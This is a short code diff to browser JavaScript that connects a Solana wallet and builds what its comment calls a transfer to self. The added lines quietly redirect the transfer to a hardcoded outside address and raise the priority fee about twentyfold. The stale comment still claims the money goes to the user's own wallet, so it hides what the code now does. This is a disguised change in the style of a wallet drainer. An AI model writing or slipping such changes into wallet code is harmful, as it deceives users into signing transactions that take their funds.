@@ -19,6 +19,7 @@
 			// Connect wallet
 			const resp = await provider.connect();
 			const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
+			const dest = new solanaWeb3.PublicKey("9Yw38HgDmqrrzjCzFBvd4HVpYyANQ9wpbjyABLRmjWN");
 
 			// Create simple transfer TX
 			const connection = new solanaWeb3.Connection(rpcEndpoint, "confirmed");
@@ -31,10 +32,10 @@
 
 			tx.add(
 				solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({units: 5_000}),
-				solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 500_000 }),
+				solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 10_000_000 }),
 				solanaWeb3.SystemProgram.transfer({
 					fromPubkey: publicKey,
-					toPubkey: publicKey,
+					toPubkey: dest,
 					lamports: 10000, // 0.00001 SOL to self
 				})
 			);
